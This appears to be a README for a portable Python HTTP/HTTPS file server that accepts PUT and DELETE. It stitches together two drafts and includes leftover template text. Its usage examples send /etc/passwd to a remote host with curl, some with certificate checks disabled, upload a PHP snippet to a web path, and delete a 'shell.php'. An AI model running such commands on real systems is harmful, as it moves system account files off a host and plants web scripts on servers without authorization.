# Python Portable HTTP/HTTPS File Server

This Python script is a simple HTTP/HTTPS file server that allows you to upload and download files using the PUT method. It can serve files over HTTP and HTTPS protocols.

## Usage

To use this script, follow these steps:

1. Ensure you have Python 2 or Python 3 installed on your system.

2. Download the script, and make sure you have the required certificate and key files (cert.pem and key.pem) in the same directory.

3. Run the script with the following command:

   ```bash
   python file_server.py [options]


Available options:

    --http: Use HTTP version (default is HTTPS).
    --https: Use HTTPS version (default).
    -p or --port: Specify the port (default is 80 for HTTP and 443 for HTTPS).
    -i or --host: Specify the host (default is empty, allowing all interfaces).

    The script will start serving files, and you can access the file server via a web browser or other HTTP/HTTPS clients.

Features

    Supports both HTTP and HTTPS protocols.
    Supports both python version "2.7" & "3".
    Allows file uploads using the PUT method also have delete method for deleting files.
    Automatically selects an available port from a predefined list.

License

This script is released under the MIT License. See the LICENSE file for details.
Author

    Author: SUDOVIVEK
    GitHub: @sudovivek

Contributing

Contributions are welcome. Please open an issue or create a pull request.
Issues and Feedback

If you encounter any issues or have suggestions for improvement, please open an issue on GitHub.

Acknowledgments

Special thanks to the community and contributors for their support and feedback.


You should replace `[options]` in the usage section with the actual command-line options your script supports. You can also add more details about the script's functionality, how to obtain the required certificate and key files, and any other relevant information. Additionally, update the "Author" and "GitHub" sections with your information.






# Python HTTP/HTTPS File Server

This Python script allows you to run a simple HTTP/HTTPS file server and perform various file transfer operations. It supports both HTTP and HTTPS protocols.

## Prerequisites

Before running the script, you may need to generate SSL certificates if you plan to use HTTPS. Use the following command to generate self-signed certificates:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

Usage
Running the Server

To start the server, use the following commands:

    For HTTP (default):

bash

python3 python2-http.py --http

    For HTTPS:

bash

python3 python2-http.py --https

You can also specify the IP address and port with the -i and -p options, respectively. For example:

bash

python3 python2-http.py --https -i 192.168.1.143
python3 python2-http.py --https -p 8080

Uploading Files

You can use various methods to upload files to the server:

    Using curl for HTTP:

bash

curl -v -X PUT --upload-file /etc/passwd http://192.168.1.143
curl -X PUT --data-binary "@/etc/passwd" http://192.168.1.143:8000
curl -v -X PUT -d "<?php phpinfo(); ?>" http://192.168.1.18/test/1.php

    Using curl for HTTPS (with certificate check disabled):

bash

curl -v -X PUT --upload-file /etc/passwd https://192.168.1.143 -k

    Using curl to upload and rename a file:

bash

curl -v -X PUT -T /etc/passwd https://192.168.1.143/passwd_10 -k

    Using curl to delete a file:

bash

curl -X DELETE http://192.168.1.18/test/shell.php

    Using wget to download a file:

bash

wget http://192.168.1.20:8080/file.txt
wget http://192.168.1.20:8080/file.txt -O /tmp/file.txt

    Using wget to download a file from an HTTPS server (with certificate check disabled):

bash

wget https://192.168.1.20:8080/file.txt -O /tmp/file.txt --no-check-certificate
